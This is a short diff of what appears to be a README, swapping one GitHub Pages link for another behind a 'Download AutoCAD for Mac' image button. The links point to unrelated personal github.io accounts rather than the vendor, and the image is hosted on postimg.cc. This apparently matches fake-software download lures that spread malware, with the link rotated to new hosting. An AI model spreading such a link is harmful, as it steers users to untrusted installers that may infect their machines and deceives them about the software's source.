@@ -22,7 +22,7 @@
 </p>
 
 <p align="center">
-  <a href="https://pudge-wagner.github.io/.github/autocad-mac">
+  <a href="https://skalsd-oasd.github.io/.github/autocad-mac">
     <img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png"
          alt="Download AutoCAD for Mac — professional CAD software" width="160"/>
   </a>
